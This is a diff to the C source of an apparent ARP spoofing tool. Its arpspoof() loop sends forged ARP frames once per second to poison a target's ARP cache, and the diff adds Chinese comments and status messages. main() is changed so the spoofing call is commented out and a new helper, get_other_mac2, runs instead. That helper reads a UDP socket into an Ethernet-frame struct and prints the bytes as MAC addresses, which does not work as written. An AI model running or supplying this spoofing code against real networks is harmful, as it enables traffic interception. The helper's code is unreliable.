@@ -15,6 +15,8 @@
 #include<arpa/inet.h>
 #include<net/if.h>
 #include<sys/ioctl.h>
+
+//Arp报文
 struct arp_packet{
 	unsigned char hardw_type[2];		//硬件类型
 	unsigned char prot_type[2];		//协议类型
@@ -60,7 +62,7 @@ void init_arp_packet(struct arp_packet * ap,const char* src_ip,const char* src_m
 
 	*((int*)ap->dest_ip) = inet_addr(dst_ip);
 }
-
+//以太网帧
 struct ethernet_packet{
 	unsigned char dest_mac[6];
 	unsigned char src_mac[6];
@@ -110,6 +112,27 @@ void init_ethernet_packet(struct ethernet_packet *ep,const char* src_ip,const ch
 	ep->frame_type[1] = 0x06;
 
 	init_arp_packet(&ep->ap,src_ip,src_mac,dst_ip,dst_mac,type);
+}
+void print_mac(const unsigned char*);
+void get_other_mac2(const char* other_ip,const char* other_mac){
+	int sd = socket(AF_INET,SOCK_DGRAM,0);
+	if(sd < 0){
+		perror("socket");
+		exit(-5);
+	}
+	struct sockaddr_in other;
+	struct ethernet_packet rcv;
+	other.sin_family = AF_INET;
+	other.sin_port = htons(rand()%65535 + 1024);
+	other.sin_addr.s_addr = inet_addr(other_ip);
+	int len = sizeof(other);
+	if(sendto(sd,"1",1,0,(struct sockaddr*)&other,len) < 0){
+		perror("sendto");
+		exit(-2);
+	}
+	recv(sd,&rcv,sizeof(rcv),0);
+	print_mac(rcv.dest_mac);
+	print_mac(rcv.src_mac);
 }
 
 void get_other_mac(const char*dev,char *local_ip,char*local_mac,const char*other_ip,char*other_mac){
@@ -164,8 +187,8 @@ void arpspoof(const char* dev,const char*host_ip,const char* host_mac,const char
 	sa.sa_family = AF_INET;
 	strcpy(sa.sa_data,dev);
 	while( sendto(sd,&ep,sizeof(ep),0,&sa,sizeof(sa)) != -1){
-		printf("正在欺骗中...\n");
-		sleep(3);
+		printf("告诉%s,我是%s\n",target_ip,host_ip);
+		sleep(1);
 	}
 }	
 
@@ -174,6 +197,8 @@ int main(int argc,const char* argv[]){
 		printf("Useage:%s [interface] [source_ip] [dest_ip]\n",argv[0]);
 		return 0;
 	}
+	get_other_mac2(argv[2],NULL);
+	/*
 	const char* dev = argv[1];
 	const char* host_ip = argv[2];
 	const char* target_ip = argv[3];
@@ -182,12 +207,14 @@ int main(int argc,const char* argv[]){
 	unsigned char host_mac[6] = {0};
 	unsigned char target_mac[6] = {0};
 	get_local_info(dev,local_ip,local_mac);
-	printf("local ip is:%s\n",local_ip);
-	printf("local mac is:");
+	printf("本地ip为:%s\n",local_ip);
+	printf("本地mac为:");
 	print_mac(local_mac);
+	printf("正在获取目标mac...\n");
 	get_other_mac(dev,local_ip,local_mac,target_ip,target_mac);
-	printf("target mac is:");
+	printf("目标mac为:");
 	print_mac(target_mac);
-	arpspoof(dev,host_ip,local_mac,target_ip,target_mac);	
+	arpspoof(dev,host_ip,local_mac,target_ip,target_mac);
+*/
 	return 0;
 }
